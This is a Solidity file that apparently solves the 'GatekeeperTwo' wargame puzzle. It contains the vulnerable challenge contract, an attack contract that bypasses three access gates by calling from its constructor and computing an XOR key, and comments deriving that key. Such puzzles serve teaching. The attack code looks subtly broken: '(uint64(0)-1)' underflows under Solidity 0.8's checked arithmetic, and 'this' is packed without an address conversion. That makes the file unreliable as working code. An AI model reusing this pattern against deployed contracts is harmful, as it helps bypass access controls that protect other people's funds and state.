// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
contract attackgatekeeper2 {

GatekeeperTwo g;
             constructor(address challengeAddress) {
           g = GatekeeperTwo(challengeAddress);
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0)-1);
        g.enter(bytes8(gateKey));
    }
}
//1^1=0
//0^0=0
//gateone() can be passed by calling the enter by another contract
//gateTwo() can be passed when function is called in the constructor (extcodesize=0)
//gateThree() can be passed x=(uint64(0)-1)^uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))
// enter(x)

// a ^ b == c
// a ^ b ^ (b ^ c) == c ^ (b ^ c)
// a ^ (b ^ b) ^ c == (c ^ c) ^ b
// a ^ 0 ^ c == 0 ^ b
// a ^ c == b

